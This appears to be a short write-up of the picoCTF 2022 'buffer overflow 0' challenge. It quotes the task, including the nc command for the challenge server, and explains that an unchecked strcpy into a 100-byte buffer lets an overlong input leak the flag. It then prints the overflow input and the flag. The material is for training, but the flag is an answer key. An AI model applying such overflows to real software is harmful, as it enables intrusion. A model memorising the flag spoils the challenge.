# picoCTF 2022 - buffer overflow 0 (Binary Exploitation)

## Description 
Smash the stack
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/521/vuln). You can view source [here](https://artifacts.picoctf.net/c/521/vuln.c). And connect with it using:

`nc saturn.picoctf.net 65355`

## Solution 
Upon inspection of the source file, we find that the `strcpy` used a 100-long buffer that can controlled by user. 
The first instinct is to enter a longer string and see if it will leak anything, and it works. 
```
Input: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}
```

## Flag
`picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}`